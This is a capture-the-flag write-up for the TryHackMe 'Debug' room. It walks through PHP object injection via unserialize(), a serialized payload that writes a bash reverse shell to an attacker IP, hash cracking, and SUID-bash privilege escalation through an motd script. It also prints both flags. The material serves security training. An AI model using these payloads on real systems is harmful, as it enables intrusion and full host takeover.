# Tryhackme.com Room : Debug

`https://tryhackme.com/room/debug`



## Instance

```
export IP='10.10.67.55'
```

## Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```



## Initial foothold

We land on an `apache2 default page` on port `80`.

We `gobuster` and find :

```
/index.php (Status: 200)
/index.html (Status: 200)
/javascript (Status: 301)
/message.txt (Status: 200)
/backup (Status: 301)
/grid (Status: 301)
```

On `index.php` everything is pretty much `lorem ipsum` but we have a form that says :

```
Form Submit (Your message will be saved on the server and will be reviewed later by our administrators)
```

Interesting.

Looking at `/message.txt` we see :

```
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment : 
```

If we submit something in the form and refresh `/message.txt` we see :

```
Message From :  || From Email :  || Comment : 
Message From :  || From Email :  || Comment :
Message From : Pwn || From Email : Pwn@pwned.com || Comment : pwned
```

So we can write to `/message.txt` using this form.



Looking at `/backup` we see a firectory listing with a copy of all the files in the website.

The interesting files are `index.html.bak` and `index.php.bak`. This allows us to read the source code for the `php` file.

Here is the interesting parts of `index.php.bak` :

```php
<?php

class FormSubmit {
public $form_file = 'message.txt';
public $message = '';

	public function SaveMessage() {

	$NameArea = $_GET['name']; 
	$EmailArea = $_GET['email'];
	$TextArea = $_GET['comments'];

	        $this-> message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

	}

	public function __destruct() {

	file_put_contents(__DIR__ . '/' . $this->form_file,$this->message,FILE_APPEND);
	echo 'Your submission has been successfully saved!';

	}

}

// Leaving this for now... only for debug purposes... do not touch!
$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application -> SaveMessage();

?>
```

The `unserialize` call is interesting. Since we have a class definition for `FormSubmit`, we can probably unserialize an object an write a php script to get a reverse shell. 

The defined method `_destruct()` make this preatty easy for us.

We just need  to create an object with the correct `$form_file` and `$message`.



We can get a proof of concept by creating a `php` file :

```php
class FormSubmit {
	public $form_file = 'pwned.php';
	public $message = '<?php phpinfo();?>';
}

$application = new FormSubmit;
echo serialize($application);
```

Execting it gives us :

```
O:10:"FormSubmit":2:{s:9:"form_file";s:9:"pwned.php";s:7:"message";s:18:"<?php phpinfo();?>";}
```

Then browsing `/index.php?debug=O:10:"FormSubmit":2:{s:9:"form_file";s:9:"pwned.php";s:7:"message";s:18:"<?php phpinfo();?>";}` unserialize the object.

We can then look at `/pwned.php` and we see a `phpinfo` output.

Success, now let's get a revshell.

Here is the php script to generate the payload. I added a `urlencode` to encode the payload.

```php
class FormSubmit {
	public $form_file = 'shell.php';
	public $message = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.6.32.20/7777 0>&1\'");';
}

$application = new FormSubmit;
echo urlencode(serialize($application));
```

And we can call it using :

```
curl http://10.10.67.55/index.php?debug=$(php serialize.php) && curl http://10.10.67.55/shell.php
```



And we got a shell as `www-data`

We find the file `/var/www/html/.htpasswd` which contains :

```
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```

We send it to `john` and we find the password

```
james:jamaica
```

We can then `su james`

We find the first flag in `/home/james/user.txt` :

```
7e37c84a66cc40b1c6bf700d08d28c20
```

## Priv Esc

We find the file `/home/james/Note-To-James.txt` :

```
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it?

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :)

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
```



This is pretty straightforward. The motd is runned by root. 

We modify `/etc/update-motd.d/00-header` and add the lines :

```
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
```

We connect to the server via ssh :

```
sshpass -p jamaica ssh james@10.10.67.55
```

Then `/tmp/bash -p` and we are `root` !

Here is the root flag `/root/root.txt` :

```
3c8c3d0fe758c320d158e32f68fabf4b
```

## Wrap up

* This was a pretty easy one. The fact that we had access to the `php` source code made it pretty easy.

